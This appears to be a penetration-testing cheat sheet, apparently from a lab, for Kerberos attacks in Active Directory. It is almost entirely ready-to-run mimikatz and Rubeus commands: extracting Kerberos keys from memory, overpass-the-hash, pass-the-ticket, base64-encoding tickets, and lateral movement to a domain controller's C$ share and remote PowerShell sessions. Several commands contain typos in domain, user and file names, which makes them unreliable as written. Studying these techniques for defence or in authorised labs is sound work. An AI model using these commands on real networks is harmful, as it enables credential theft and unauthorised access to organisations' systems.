# Pass the key or Overpass the hash 
It converts the hash/key into a full Ticket-Granting-Ticket (TGT) and open a new window to access any resource.
#### Extracting Kerberos keys (hashes) 
```
mimikatz.exe "sekurlsa::ekeys" exit
```
#### Pass the key or overpass the hash (user hash to get ticket)
- Mimikatz tool (admin rights: True) 
```
mimikatz.exe "sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:<hash>" exit
```

- Rubeus (admin right: false) 
```
Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:<hash> /nowrap
```

# Get the ticket in base64 format (Rubeus) 
```
Rubeus.exe asktgt /domain:inlanfeight.htb /user:palaintext /rc4:<hash> /ptt
```

# Convert the ticket to base64 format 
```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"))
```

# Pass the ticket 
#### Rubeus  
```
Rubeus.exe ptt /ticket:file_name.kirbi
```
```
Rubeus.exe ptt /ticket:<base64_ticket>
```
```
type \\DC01.inlanefreight.htb\C$\john\john.txt
```
#### Mimikatz 
```
mimikatz.exe "kerberos:ptt file_path.kirb i" exit
```
```
dir \\DC01.inlanefreight.htb\c$
```
# Pass the ticket (connect remotely) 
```
mimikatz.exe "kerberos:ptt file_path.kirbi" exit
```
```
powershell -c 'Enter-PSSession -ComputerName DC01'
```
```
whoami
```
#### Create a sacrificial process 
```
Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
```

- In the new windows (pass-the-ticket lateral movement) 
```
Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:<hash> /ptt
```